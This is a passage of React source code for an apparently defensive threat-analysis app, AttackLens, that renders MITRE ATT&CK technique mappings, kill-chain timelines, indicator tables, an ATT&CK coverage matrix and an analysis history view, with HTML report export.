  td.num { font-variant-numeric: tabular-nums; text-align: right; white-space: nowrap; }
  .mono { font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace; }
  .small { font-size: 9.5pt; color: #4b5563; }
  .meta { color: #6b7280; font-size: 9pt; }
  ol.chain { list-style: none; padding-left: 0; counter-reset: step; }
  .chain-step { display: flex; gap: 10pt; padding: 6pt 0; align-items: flex-start; }
  .chain-num { display: inline-flex; width: 22pt; height: 22pt; align-items: center; justify-content: center; background: #1f2937; color: white; border-radius: 50%; font-size: 9pt; font-weight: 600; flex-shrink: 0; }
  ul { padding-left: 18pt; }
  ul li { margin-bottom: 4pt; }
  .tags { margin: 6pt 0; }
  .tag { display: inline-block; background: #e0e7ff; color: #3730a3; font-size: 8.5pt; padding: 2pt 7pt; border-radius: 10pt; margin-right: 4pt; }
  .notes { background: #fefce8; border: 1px solid #fde68a; border-radius: 4pt; padding: 8pt 10pt; font-size: 10pt; white-space: pre-wrap; }
  .footer { margin-top: 24pt; padding-top: 10pt; border-top: 1px solid #e5e7eb; color: #9ca3af; font-size: 8.5pt; text-align: center; }
  @media print {
    body { padding: 0; }
    h2 { page-break-after: avoid; }
    tr, li { page-break-inside: avoid; }
  }
</style></head><body>
  <h1>${esc(analysis.title)}</h1>
  <div class="meta-row">
    Generated ${new Date().toLocaleString()} · Analysis ID ${analysis.id.slice(0, 8)} · Status: ${esc(analysis.status || "open")}
  </div>
  <div class="badges">
    <span class="badge sev-${analysis.severity >= 90 ? "critical" : analysis.severity >= 75 ? "high" : analysis.severity >= 50 ? "medium" : analysis.severity >= 25 ? "low" : "info"}">Severity ${analysis.severity ?? "—"} · ${sevLabel(analysis.severity || 0)}</span>
    ${analysis.platforms?.map(p => `<span class="badge" style="background:#e0e7ff;color:#3730a3">${esc(p)}</span>`).join("") || ""}
  </div>
  ${tagsHTML ? `<div class="tags">${tagsHTML}</div>` : ""}
  <div class="kpi-grid">
    <div class="kpi"><div class="kpi-label">Severity</div><div class="kpi-value">${analysis.severity ?? "—"}</div></div>
    <div class="kpi"><div class="kpi-label">Confidence</div><div class="kpi-value">${analysis.confidence != null ? Math.round(analysis.confidence * 100) + "%" : "—"}</div></div>
    <div class="kpi"><div class="kpi-label">Risk Score</div><div class="kpi-value">${analysis.risk_score ?? "—"}</div></div>
    <div class="kpi"><div class="kpi-label">Techniques</div><div class="kpi-value">${analysis.mappings?.length || 0}</div></div>
  </div>

  <h2>Executive Summary</h2>
  <p>${esc(analysis.summary || "—")}</p>

  ${analysis.narrative ? `<h3>Narrative</h3><p>${esc(analysis.narrative)}</p>` : ""}

  ${analysis.notes ? `<h3>Analyst Notes</h3><div class="notes">${esc(analysis.notes)}</div>` : ""}

  ${chainHTML ? `<h2>Attack Chain</h2><ol class="chain">${chainHTML}</ol>` : ""}

  ${mappingsHTML ? `<h2>MITRE ATT&amp;CK Mappings</h2>
  <table>
    <thead><tr><th>Technique</th><th>Name</th><th>Tactic</th><th class="num">Sev</th><th class="num">Conf</th><th>Reasoning</th></tr></thead>
    <tbody>${mappingsHTML}</tbody>
  </table>` : ""}

  ${iocsHTML ? `<h2>Indicators of Compromise</h2>
  <table>
    <thead><tr><th>Type</th><th>Value</th><th>Context</th></tr></thead>
    <tbody>${iocsHTML}</tbody>
  </table>` : ""}

  ${actorsHTML ? `<h2>Threat Actor Overlap</h2><ul>${actorsHTML}</ul>` : ""}

  ${recHTML ? `<h2>Recommendations</h2><ul>${recHTML}</ul>` : ""}

  <div class="footer">Generated by AttackLens · MITRE ATT&amp;CK auto-mapping engine</div>
  <script>setTimeout(() => window.print(), 600);</script>
</body></html>`;

    const blob = new Blob([html], { type: "text/html" });
    const url = URL.createObjectURL(blob);
    const w = window.open(url, "_blank");
    if (!w) {
      // Pop-up blocked — fall back to downloading the file
      const a = document.createElement("a");
      a.href = url; a.download = `attacklens-report-${analysis.id.slice(0, 8)}.html`;
      a.click();
    }
    setTimeout(() => URL.revokeObjectURL(url), 30000);
  };

  const mappingsByTactic = useMemo(() => {
    const m = {};
    (analysis.mappings || []).forEach(x => {
      const t = x.tactic_id || "unknown";
      (m[t] = m[t] || []).push(x);
    });
    return m;
  }, [analysis]);

  const STATUS_OPTIONS = [
    { id: "open",       label: "Open",            color: "text-cyan-300 bg-cyan-500/10 border-cyan-500/30" },
    { id: "investigating", label: "Investigating", color: "text-amber-300 bg-amber-500/10 border-amber-500/30" },
    { id: "tp",         label: "True Positive",   color: "text-red-300 bg-red-500/10 border-red-500/30" },
    { id: "fp",         label: "False Positive",  color: "text-emerald-300 bg-emerald-500/10 border-emerald-500/30" },
    { id: "closed",     label: "Closed",          color: "text-zinc-300 bg-zinc-700/40 border-zinc-600" },
  ];
  const currentStatus = STATUS_OPTIONS.find(s => s.id === (analysis.status || "open")) || STATUS_OPTIONS[0];

  return (
    <div className="space-y-4">
      <div className="flex items-start justify-between gap-4">
        <div className="flex-1 min-w-0">
          <button onClick={onBack} className="text-xs text-zinc-500 hover:text-zinc-300 inline-flex items-center gap-1 mb-1">
            <ChevronRight size={12} className="rotate-180" /> Back
          </button>
          <h1 className="text-2xl font-semibold text-zinc-100 truncate">{analysis.title}</h1>
          <div className="text-sm text-zinc-500 mt-1">
            {new Date(analysis.created_at).toLocaleString()} · {analysis.input_type}
            {analysis.detected_format && analysis.detected_format !== "unknown" && <> · detected: <span className="text-zinc-400">{analysis.detected_format}</span></>}
          </div>
        </div>
        <div className="flex items-center gap-2 flex-wrap justify-end">
          {/* Status selector */}
          <div className="relative">
            <button onClick={() => setStatusOpen(!statusOpen)}
              className={`inline-flex items-center gap-1.5 px-3 py-2 rounded-md text-xs font-medium border ${currentStatus.color}`}>
              <span className="w-1.5 h-1.5 rounded-full bg-current" />
              {currentStatus.label}
              <ChevronDown size={11} />
            </button>
            {statusOpen && (
              <div className="absolute right-0 mt-1 w-44 bg-zinc-900 border border-zinc-700 rounded-md shadow-xl z-20 py-1">
                {STATUS_OPTIONS.map(s => (
                  <button key={s.id} onClick={() => setStatus(s.id)}
                    className="w-full text-left px-3 py-1.5 text-xs text-zinc-300 hover:bg-zinc-800 inline-flex items-center gap-2">
                    <span className={`inline-block w-1.5 h-1.5 rounded-full ${s.color.split(" ")[1]}`} />
                    {s.label}
                  </button>
                ))}
              </div>
            )}
          </div>
          <Button variant="primary" icon={Printer} onClick={exportReport}>Report</Button>
          <Button variant="ghost" icon={Download} onClick={exportJSON}>JSON</Button>
          <Button variant="ghost" icon={Download} onClick={exportNavigator}>Navigator</Button>
          <Button variant="ghost" icon={Plus} onClick={onNewAnalysis}>Analyze another</Button>
          <Button variant="danger" icon={Trash2} onClick={() => { if (confirm("Delete this analysis?")) { onDelete(analysis.id); } }}>Delete</Button>
        </div>
      </div>

      {/* Tags + notes strip */}
      <Card className="p-3">
        <div className="flex items-start gap-4">
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-2 mb-1.5">
              <Tag size={12} className="text-zinc-500" />
              <div className="text-[10px] uppercase tracking-widest text-zinc-500">Tags</div>
            </div>
            <div className="flex items-center gap-1.5 flex-wrap">
              {(analysis.tags || []).map(t => (
                <span key={t} className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-violet-500/10 border border-violet-500/30 text-violet-200 text-xs">
                  {t}
                  <button onClick={() => removeTag(t)} className="hover:text-red-400 text-violet-300/60"><X size={10} /></button>
                </span>
              ))}
              <input
                value={tagInput}
                onChange={e => setTagInput(e.target.value)}
                onKeyDown={e => { if (e.key === "Enter") { e.preventDefault(); addTag(); } }}
                placeholder={analysis.tags?.length ? "+ tag" : "Add tag (e.g. ransomware, ticket-12345, tier2)…"}
                className="bg-transparent border-none focus:outline-none text-xs text-zinc-200 placeholder-zinc-600 min-w-[160px] py-0.5"
              />
            </div>
          </div>
          <div className="w-px h-12 bg-zinc-800" />
          <div className="flex-1 min-w-0">
            <div className="flex items-center justify-between mb-1.5">
              <div className="flex items-center gap-2">
                <StickyNote size={12} className="text-zinc-500" />
                <div className="text-[10px] uppercase tracking-widest text-zinc-500">Analyst Notes</div>
              </div>
              {notesDraft !== (analysis.notes || "") && (
                <button onClick={saveNotes} className="text-[10px] inline-flex items-center gap-1 px-2 py-0.5 rounded bg-cyan-500/10 border border-cyan-500/30 text-cyan-300 hover:bg-cyan-500/20">
                  <Save size={10} />Save
                </button>
              )}
              {notesSaved && <span className="text-[10px] text-emerald-400 inline-flex items-center gap-1"><Check size={10} />Saved</span>}
            </div>
            <textarea
              value={notesDraft}
              onChange={e => setNotesDraft(e.target.value)}
              placeholder="Add notes for future you. Ticket numbers, what you confirmed, follow-ups…"
              className="w-full bg-transparent text-xs text-zinc-200 placeholder-zinc-600 focus:outline-none resize-none border-none"
              rows={2}
            />
          </div>
        </div>
      </Card>

      <div className="grid grid-cols-4 gap-3">
        <Card className="p-4">
          <div className="text-[10px] text-zinc-500 uppercase tracking-widest">Severity</div>
          <div className={`mt-1 text-3xl font-mono tabular-nums ${sevColor(analysis.severity)}`}>{analysis.severity ?? "—"}</div>
          <div className="mt-1 text-xs text-zinc-500">{analysis.severity != null ? sevLabel(analysis.severity) : ""}</div>
        </Card>
        <Card className="p-4">
          <div className="text-[10px] text-zinc-500 uppercase tracking-widest">Confidence</div>
          <div className="mt-1 text-3xl font-mono tabular-nums text-zinc-100">{analysis.confidence != null ? `${Math.round(analysis.confidence * 100)}%` : "—"}</div>
          <div className="mt-1 text-xs text-zinc-500">Model confidence</div>
        </Card>
        <Card className="p-4">
          <div className="text-[10px] text-zinc-500 uppercase tracking-widest">Risk Score</div>
          <div className={`mt-1 text-3xl font-mono tabular-nums ${sevColor(analysis.risk_score)}`}>{analysis.risk_score ?? "—"}</div>
          <div className="mt-1 text-xs text-zinc-500">Composite</div>
        </Card>
        <Card className="p-4">
          <div className="text-[10px] text-zinc-500 uppercase tracking-widest">Techniques Mapped</div>
          <div className="mt-1 text-3xl font-mono tabular-nums text-zinc-100">{analysis.mappings?.length || 0}</div>
          <div className="mt-1 text-xs text-zinc-500">
            across {new Set((analysis.mappings || []).map(m => m.tactic_id)).size} tactics
          </div>
        </Card>
      </div>

      <Card className="overflow-hidden">
        <div className="flex border-b border-zinc-800">
          {DETAIL_TABS.map(t => {
            const Icon = t.icon;
            const active = tab === t.id;
            const count = {
              mappings:   analysis.mappings?.length,
              chain:      analysis.chain?.length,
              detections: analysis.detections?.length,
              iocs:       analysis.iocs?.length,
              actors:     analysis.threat_actors?.length,
            }[t.id];
            return (
              <button key={t.id} onClick={() => setTab(t.id)}
                className={`flex items-center gap-2 px-4 py-3 text-sm border-b-2 transition-colors ${
                  active ? "border-cyan-500 text-cyan-300 bg-cyan-500/5" : "border-transparent text-zinc-500 hover:text-zinc-300"
                }`}>
                <Icon size={14} />
                {t.label}
                {count != null && count > 0 && (
                  <span className={`text-[10px] px-1.5 py-0.5 rounded ${active ? "bg-cyan-500/20 text-cyan-300" : "bg-zinc-800 text-zinc-400"}`}>{count}</span>
                )}
              </button>
            );
          })}
        </div>

        <div className="p-4">
          {tab === "overview" && (
            <div className="space-y-4">
              <div>
                <div className="flex items-center justify-between mb-1">
                  <div className="text-[10px] text-zinc-500 uppercase tracking-widest">Summary</div>
                  <CopyBtn text={analysis.summary || ""} />
                </div>
                <div className="text-sm text-zinc-200 leading-relaxed bg-zinc-950/40 border border-zinc-800 rounded-md p-3">
                  {analysis.summary}
                </div>
              </div>

              {/* Quick story — numbered timeline of the attack at a glance */}
              {analysis.chain?.length > 0 && (
                <div>
                  <div className="flex items-center gap-2 mb-2">
                    <ListOrdered size={12} className="text-cyan-400" />
                    <div className="text-[10px] text-zinc-500 uppercase tracking-widest">Attack Story</div>
                    <div className="text-[10px] text-zinc-600">— quick read of the chain in order</div>
                  </div>
                  <div className="bg-zinc-950/40 border border-zinc-800 rounded-md p-3 space-y-1.5">
                    {analysis.chain.map((s, i) => (
                      <div key={i} className="flex items-baseline gap-2 text-sm">
                        <span className="font-mono text-cyan-400 text-xs flex-shrink-0 w-4 text-right">{s.order}.</span>
                        <div className="flex-1">
                          <span className="text-zinc-200">{s.description}</span>
                          <span className="ml-2 text-[11px] font-mono text-zinc-500">
                            [{s.technique_id}{s.timestamp ? ` · ${s.timestamp}` : ""}]
                          </span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {analysis.narrative && (
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <div className="text-[10px] text-zinc-500 uppercase tracking-widest">Narrative</div>
                    <CopyBtn text={analysis.narrative || ""} />
                  </div>
                  <div className="text-sm text-zinc-300 leading-relaxed bg-zinc-950/40 border border-zinc-800 rounded-md p-3">
                    {analysis.narrative}
                  </div>
                </div>
              )}
              {analysis.platforms?.length > 0 && (
                <div>
                  <div className="text-[10px] text-zinc-500 uppercase tracking-widest mb-1">Platforms</div>
                  <div className="flex gap-1.5 flex-wrap">
                    {analysis.platforms.map(p => <Pill key={p} className="border-zinc-700 text-zinc-300 bg-zinc-800/40">{p}</Pill>)}
                  </div>
                </div>
              )}
              {analysis.recommendations?.length > 0 && (
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <div className="text-[10px] text-zinc-500 uppercase tracking-widest">Recommendations</div>
                    <CopyBtn text={(analysis.recommendations || []).map(r => `• ${r}`).join("\n")} />
                  </div>
                  <ul className="space-y-1.5">
                    {analysis.recommendations.map((r, i) => (
                      <li key={i} className="text-sm text-zinc-300 flex items-start gap-2">
                        <Zap size={12} className="text-amber-400 flex-shrink-0 mt-1" />
                        <span>{r}</span>
                      </li>
                    ))}
                  </ul>
                </div>
              )}
              {analysis.input_preview && (
                <div>
                  <div className="text-[10px] text-zinc-500 uppercase tracking-widest mb-1">Original Input (preview)</div>
                  <pre className="text-xs font-mono text-zinc-400 bg-zinc-950/60 border border-zinc-800 rounded-md p-3 max-h-48 overflow-auto whitespace-pre-wrap">{analysis.input_preview}</pre>
                </div>
              )}
            </div>
          )}

          {tab === "mappings" && (
            <div className="space-y-4">
              {analysis.mappings?.length > 0 ? (
                TACTICS.filter(t => mappingsByTactic[t.id]?.length).map(t => (
                  <div key={t.id}>
                    <div className="flex items-center gap-2 mb-2">
                      <div className="text-xs font-semibold text-zinc-300 uppercase tracking-wider">{t.name}</div>
                      <div className="text-[10px] font-mono text-zinc-600">{t.id}</div>
                      <div className="flex-1 h-px bg-zinc-800" />
                      <div className="text-[10px] text-zinc-500">{mappingsByTactic[t.id].length} {mappingsByTactic[t.id].length === 1 ? "technique" : "techniques"}</div>
                    </div>
                    <div className="space-y-2">
                      {mappingsByTactic[t.id].map((m, i) => (
                        <MappingCard key={i} m={m} feedback={feedback} onFeedback={onFeedback} />
                      ))}
                    </div>
                  </div>
                ))
              ) : (
                <div className="text-center py-8 text-zinc-500 text-sm">No technique mappings.</div>
              )}
            </div>
          )}

          {tab === "chain" && (
            <div>
              {analysis.chain?.length > 0 ? (
                <div>
                  {analysis.chain.map((s, i) => (
                    <KillChainStep key={i} step={s} isLast={i === analysis.chain.length - 1} />
                  ))}
                </div>
              ) : (
                <div className="text-center py-8 text-zinc-500 text-sm">
                  No kill chain inferable from this input.
                </div>
              )}
            </div>
          )}

          {tab === "detections" && (
            <div className="space-y-3">
              {analysis.detections?.length > 0 ? (
                analysis.detections.map((d, i) => <DetectionPanel key={i} d={d} />)
              ) : (
                <div className="text-center py-8 text-zinc-500 text-sm">No detections generated.</div>
              )}
            </div>
          )}

          {tab === "iocs" && (
            <div>
              {analysis.iocs?.length > 0 ? (
                <div className="border border-zinc-800 rounded-md overflow-hidden">
                  <table className="w-full text-sm">
                    <thead className="bg-zinc-900/60 border-b border-zinc-800">
                      <tr>
                        <th className="px-3 py-2 text-left text-[10px] uppercase tracking-widest text-zinc-500">Type</th>
                        <th className="px-3 py-2 text-left text-[10px] uppercase tracking-widest text-zinc-500">Value</th>
                        <th className="px-3 py-2 text-left text-[10px] uppercase tracking-widest text-zinc-500">Context</th>
                      </tr>
                    </thead>
                    <tbody>
                      {analysis.iocs.map((ioc, i) => (
                        <tr key={i} className="border-b border-zinc-800/60 last:border-0">
                          <td className="px-3 py-2"><Pill className="border-zinc-700 text-zinc-300 bg-zinc-800/40">{ioc.type}</Pill></td>
                          <td className="px-3 py-2 font-mono text-xs text-cyan-300">{ioc.value}</td>
                          <td className="px-3 py-2 text-xs text-zinc-400">{ioc.context}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              ) : (
                <div className="text-center py-8 text-zinc-500 text-sm">No IOCs extracted.</div>
              )}
            </div>
          )}

          {tab === "actors" && (
            <div className="space-y-2">
              {analysis.threat_actors?.length > 0 ? (
                analysis.threat_actors.map((a, i) => (
                  <div key={i} className="border border-zinc-800 rounded-md p-3 bg-zinc-900/30">
                    <div className="flex items-start justify-between gap-3">
                      <div className="flex-1">
                        <div className="flex items-center gap-2">
                          <Skull size={14} className="text-fuchsia-400" />
                          <span className="text-sm font-semibold text-zinc-100">{a.name}</span>
                        </div>
                        <div className="mt-1.5 text-xs text-zinc-400 leading-relaxed">{a.reasoning}</div>
                      </div>
                      <div className="text-right flex-shrink-0">
                        <div className="text-xl font-mono tabular-nums text-fuchsia-300">{Math.round(a.similarity * 100)}%</div>
                        <div className="text-[10px] uppercase tracking-widest text-zinc-500">overlap</div>
                      </div>
                    </div>
                    <div className="mt-3 h-1 rounded-full bg-zinc-800 overflow-hidden">
                      <div className="h-full bg-gradient-to-r from-fuchsia-500 to-violet-500" style={{ width: `${a.similarity * 100}%` }} />
                    </div>
                  </div>
                ))
              ) : (
                <div className="text-center py-8 text-zinc-500 text-sm">No threat-actor overlap found.</div>
              )}
            </div>
          )}
        </div>
      </Card>
    </div>
  );
};

/* ----------------------------------------------------------------- */
/*  Full ATT&CK Matrix view                                            */
/* ----------------------------------------------------------------- */
const MatrixView = ({ analyses, openTechniqueDetail }) => {
  const [filter, setFilter] = useState("");
  const [showOnlyHit, setShowOnlyHit] = useState(false);

  const coverage = useMemo(() => {
    const c = {};
    analyses.forEach(a => {
      (a.mappings || []).forEach(m => {
        if (!c[m.technique_id]) c[m.technique_id] = { count: 0, maxSeverity: 0, analyses: [] };
        c[m.technique_id].count += 1;
        c[m.technique_id].maxSeverity = Math.max(c[m.technique_id].maxSeverity, m.severity || 0);
        c[m.technique_id].analyses.push({ id: a.id, title: a.title });
      });
    });
    return c;
  }, [analyses]);

  return (
    <div className="space-y-4">
      <div className="flex items-end justify-between">
        <div>
          <div className="text-[10px] text-zinc-500 uppercase tracking-widest">Coverage</div>
          <h1 className="text-2xl font-semibold text-zinc-100">MITRE ATT&CK Matrix</h1>
          <div className="text-sm text-zinc-500 mt-1">
            Enterprise · {TECHNIQUES.length} techniques mapped across {TACTICS.length} tactics · {Object.keys(coverage).length} covered by your analyses
          </div>
        </div>
        <div className="flex items-center gap-2">
          <div className="relative">
            <Search size={13} className="absolute left-2.5 top-1/2 -translate-y-1/2 text-zinc-500" />
            <input value={filter} onChange={e => setFilter(e.target.value)} placeholder="Filter techniques…"
              className="bg-zinc-950 border border-zinc-800 rounded-md pl-8 pr-3 py-1.5 text-sm text-zinc-200 placeholder-zinc-600 focus:border-cyan-500/50 focus:outline-none w-56" />
          </div>
          <Button variant="ghost" icon={Filter} onClick={() => setShowOnlyHit(!showOnlyHit)}>
            {showOnlyHit ? "Show All" : "Only Covered"}
          </Button>
        </div>
      </div>

      <Card className="p-3">
        <div className="overflow-x-auto">
          <div className="grid gap-2 min-w-fit" style={{ gridTemplateColumns: `repeat(${TACTICS.length}, minmax(170px, 1fr))` }}>
            {TACTICS.map(t => (
              <div key={t.id} className="px-2 pb-2 border-b border-zinc-800">
                <div className="text-xs font-semibold text-zinc-200">{t.name}</div>
                <div className="text-[10px] font-mono text-zinc-600">{t.id}</div>
              </div>
            ))}
            {TACTICS.map(t => {
              const techs = (TECHS_BY_TACTIC[t.id] || []).filter(tech => {
                if (showOnlyHit && !coverage[tech.id]) return false;
                if (!filter) return true;
                const q = filter.toLowerCase();
                return tech.id.toLowerCase().includes(q) || tech.name.toLowerCase().includes(q);
              });
              return (
                <div key={t.id} className="space-y-1 px-1">
                  {techs.map(tech => {
                    const cov = coverage[tech.id];
                    return (
                      <button key={tech.id} onClick={() => cov && openTechniqueDetail(tech.id)}
                        disabled={!cov}
                        className={`w-full text-left p-1.5 rounded border text-xs transition-all ${
                          cov
                            ? `${sevBg(cov.maxSeverity)} hover:brightness-125 cursor-pointer`
                            : "bg-zinc-900/40 border-zinc-800/60 hover:bg-zinc-800/30"
                        }`}>
                        <div className="font-mono text-[10px] text-zinc-400 truncate">{tech.id}</div>
                        <div className={`text-[11px] truncate ${cov ? "text-zinc-100" : "text-zinc-500"}`}>{tech.name}</div>
                        {cov && (
                          <div className="mt-0.5 flex items-center justify-between">
                            <span className="text-[10px] text-zinc-400">{cov.count}× hit</span>
                            <span className={`text-[10px] font-mono ${sevColor(cov.maxSeverity)}`}>sev {cov.maxSeverity}</span>
                          </div>
                        )}
                      </button>
                    );
                  })}
                </div>
              );
            })}
          </div>
        </div>
      </Card>
    </div>
  );
};

const TechniqueDetailModal = ({ techId, analyses, onClose, onOpenAnalysis }) => {
  const tech = TECH_BY_ID[techId];
  const hits = useMemo(() => {
    const out = [];
    analyses.forEach(a => {
      (a.mappings || []).forEach(m => {
        if (m.technique_id === techId) out.push({ analysis: a, mapping: m });
      });
    });
    return out;
  }, [techId, analyses]);

  return (
    <div className="fixed inset-0 z-50 flex items-start justify-center p-6 bg-zinc-950/80 backdrop-blur-sm overflow-y-auto"
      onClick={onClose}>
      <div className="bg-zinc-900 border border-zinc-800 rounded-lg shadow-2xl w-full max-w-3xl my-6" onClick={e => e.stopPropagation()}>
        <div className="p-4 border-b border-zinc-800 flex items-start justify-between">
          <div>
            <div className="flex items-center gap-2">
              <span className="font-mono text-base text-cyan-400">{techId}</span>
              <span className="text-base font-semibold text-zinc-100">{tech?.name || "Unknown technique"}</span>
            </div>
            {tech && (
              <div className="text-xs text-zinc-500 mt-1">
                Tactic: <span className="text-zinc-300">{TACTIC_BY_ID[tech.tactic]?.name}</span>
                {" · "}
                <a href={`https://attack.mitre.org/techniques/${techId.replace(".", "/")}/`} target="_blank" rel="noopener noreferrer"
                  className="text-cyan-400 hover:text-cyan-300 inline-flex items-center gap-1">
                  attack.mitre.org <ExternalLink size={10} />
                </a>
              </div>
            )}
          </div>
          <button onClick={onClose} className="p-1.5 rounded hover:bg-zinc-800 text-zinc-400 hover:text-zinc-200"><X size={16} /></button>
        </div>
        <div className="p-4">
          <div className="text-[10px] text-zinc-500 uppercase tracking-widest mb-2">{hits.length} analyses contain this technique</div>
          <div className="space-y-2">
            {hits.map((h, i) => (
              <button key={i} onClick={() => { onOpenAnalysis(h.analysis.id); onClose(); }}
                className="w-full text-left p-3 rounded-md border border-zinc-800 bg-zinc-900/30 hover:bg-zinc-800/40 hover:border-zinc-700 transition-colors">
                <div className="flex items-start gap-3">
                  <div className={`w-2 h-2 rounded-full mt-2 ${sevDot(h.mapping.severity)}`} />
                  <div className="flex-1 min-w-0">
                    <div className="text-sm text-zinc-200 font-medium truncate">{h.analysis.title}</div>
                    <div className="text-xs text-zinc-500 mt-0.5">{new Date(h.analysis.created_at).toLocaleString()}</div>
                    {h.mapping.evidence?.[0] && (
                      <div className="mt-1.5 text-xs text-zinc-400 font-mono truncate">"{h.mapping.evidence[0]}"</div>
                    )}
                  </div>
                  <div className="text-right flex-shrink-0">
                    <div className={`text-sm font-mono ${sevColor(h.mapping.severity)}`}>{h.mapping.severity}</div>
                    <div className="text-[10px] text-zinc-500">sev</div>
                  </div>
                </div>
              </button>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
};

/* ----------------------------------------------------------------- */
/*  History view                                                       */
/* ----------------------------------------------------------------- */
const HistoryView = ({ analyses, openAnalysis, deleteAnalysis }) => {
  const [filter, setFilter] = useState("");
  const [sevFilter, setSevFilter] = useState("all");
  const [tagFilter, setTagFilter] = useState(null);

  // Build the global tag cloud
  const allTags = useMemo(() => {
    const counts = {};
    analyses.forEach(a => (a.tags || []).forEach(t => counts[t] = (counts[t] || 0) + 1));
    return Object.entries(counts).sort((a, b) => b[1] - a[1]).slice(0, 12);
  }, [analyses]);

  const filtered = analyses.filter(a => {
    if (sevFilter === "critical" && (a.severity || 0) < 75) return false;
    if (sevFilter === "medium" && ((a.severity || 0) < 25 || (a.severity || 0) >= 75)) return false;
    if (sevFilter === "low" && (a.severity || 0) >= 25) return false;
    if (tagFilter && !(a.tags || []).includes(tagFilter)) return false;
    if (!filter) return true;
    const q = filter.toLowerCase();
    return (a.title || "").toLowerCase().includes(q) ||
           (a.summary || "").toLowerCase().includes(q) ||
           (a.notes || "").toLowerCase().includes(q) ||
           (a.tags || []).some(t => t.toLowerCase().includes(q)) ||
           (a.mappings || []).some(m => m.technique_id.toLowerCase().includes(q) || m.technique_name?.toLowerCase().includes(q));
  });

  return (
    <div className="space-y-4">
      <div className="flex items-end justify-between">
        <div>
          <div className="text-[10px] text-zinc-500 uppercase tracking-widest">All Analyses</div>
          <h1 className="text-2xl font-semibold text-zinc-100">History</h1>
          <div className="text-sm text-zinc-500 mt-1">{filtered.length} of {analyses.length} analyses</div>
        </div>
        <div className="flex items-center gap-2">
          <div className="flex bg-zinc-900 border border-zinc-800 rounded-md p-0.5">
            {[
              { id: "all", label: "All" },
              { id: "critical", label: "Critical+" },
              { id: "medium", label: "Med" },
              { id: "low", label: "Low" },
            ].map(s => (
              <button key={s.id} onClick={() => setSevFilter(s.id)}
                className={`px-2.5 py-1 text-xs rounded transition-colors ${sevFilter === s.id ? "bg-zinc-800 text-cyan-300" : "text-zinc-500 hover:text-zinc-300"}`}>
                {s.label}
              </button>
            ))}
          </div>
          <div className="relative">
            <Search size={13} className="absolute left-2.5 top-1/2 -translate-y-1/2 text-zinc-500" />
            <input value={filter} onChange={e => setFilter(e.target.value)} placeholder="Search title, technique, tag, notes…"
              className="bg-zinc-950 border border-zinc-800 rounded-md pl-8 pr-3 py-1.5 text-sm text-zinc-200 placeholder-zinc-600 focus:border-cyan-500/50 focus:outline-none w-72" />
          </div>
        </div>
      </div>

      {allTags.length > 0 && (
        <div className="flex items-center gap-2 flex-wrap">
          <span className="text-[10px] uppercase tracking-widest text-zinc-500">Tags:</span>
          {tagFilter && (
            <button onClick={() => setTagFilter(null)} className="text-[11px] px-2 py-0.5 rounded bg-zinc-800 text-zinc-400 hover:text-zinc-200 inline-flex items-center gap-1">
              <X size={10} /> clear
            </button>
          )}
          {allTags.map(([t, n]) => (
            <button key={t} onClick={() => setTagFilter(tagFilter === t ? null : t)}
              className={`text-[11px] px-2 py-0.5 rounded-full border transition-colors ${
                tagFilter === t
                  ? "bg-violet-500/20 border-violet-500/40 text-violet-200"
                  : "bg-violet-500/5 border-violet-500/20 text-violet-300/80 hover:bg-violet-500/10"
              }`}>
              #{t} <span className="text-zinc-500 ml-1">{n}</span>
            </button>
          ))}
        </div>
      )}

      {filtered.length === 0 ? (
        <Card className="p-12 text-center">
          <div className="text-zinc-500">No analyses match.</div>
        </Card>
      ) : (
        <div className="space-y-2">
          {filtered.map(a => (
            <div key={a.id} className="flex items-center gap-3 p-3 rounded-md bg-zinc-900/40 border border-zinc-800 hover:border-zinc-700 transition-colors">
              <button onClick={() => openAnalysis(a.id)} className="flex-1 flex items-start gap-3 text-left min-w-0">
                <div className={`w-2 h-2 rounded-full mt-2 flex-shrink-0 ${sevDot(a.severity)}`} />
                <div className="flex-1 min-w-0">
                  <div className="text-sm text-zinc-100 font-medium truncate flex items-center gap-2">
                    {a.title}
                    {a.status && a.status !== "open" && (
                      <span className="text-[9px] uppercase tracking-widest text-zinc-500 px-1.5 py-0.5 rounded bg-zinc-800">{a.status}</span>
                    )}
                  </div>
                  <div className="text-xs text-zinc-500 mt-0.5 flex items-center gap-1.5 flex-wrap">
                    <span>{new Date(a.created_at).toLocaleString()} · {a.input_type}</span>
                    {a.mappings?.length > 0 && <span>· <span className="text-zinc-400">{a.mappings.length}</span> techniques</span>}
                  </div>
                  {a.summary && <div className="text-xs text-zinc-400 mt-1.5 line-clamp-2">{a.summary}</div>}
                  {(a.tags?.length > 0 || a.notes) && (
                    <div className="mt-1.5 flex items-center gap-1.5 flex-wrap">
                      {a.tags?.map(t => (
                        <span key={t} className="text-[10px] px-1.5 py-0.5 rounded-full bg-violet-500/10 border border-violet-500/20 text-violet-300">#{t}</span>
                      ))}
                      {a.notes && (
                        <span className="text-[10px] text-amber-300/80 inline-flex items-center gap-1">
                          <StickyNote size={9} /> {a.notes.length > 60 ? a.notes.slice(0, 60) + "…" : a.notes}
                        </span>
                      )}
                    </div>
                  )}
                </div>
                <div className="text-right flex-shrink-0">
                  <div className={`text-sm font-mono tabular-nums ${sevColor(a.severity)}`}>{a.severity ?? "—"}</div>
                  <div className="text-[10px] text-zinc-500 uppercase tracking-wider">sev</div>
                </div>
              </button>
              <button onClick={() => { if (confirm("Delete?")) deleteAnalysis(a.id); }}
                className="p-2 text-zinc-500 hover:text-red-400 hover:bg-red-500/10 rounded">
                <Trash2 size={14} />
              </button>
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

/* ----------------------------------------------------------------- */
/*  Root App                                                           */
/* ----------------------------------------------------------------- */
export default function AttackLensApp() {
  const [view, setView] = useState("dashboard");
  const [analyses, setAnalyses] = useState([]);
  const [currentAnalysis, setCurrentAnalysis] = useState(null);
  const [techDetail, setTechDetail] = useState(null);
  const [loading, setLoading] = useState(true);
  const [analyzePrefill, setAnalyzePrefill] = useState(null);  // { content, mode, title } from Refine handoff

  const refresh = useCallback(async () => {
    const idx = await storage.listAnalyses();
    const full = await Promise.all(idx.map(e => storage.getAnalysis(e.id)));
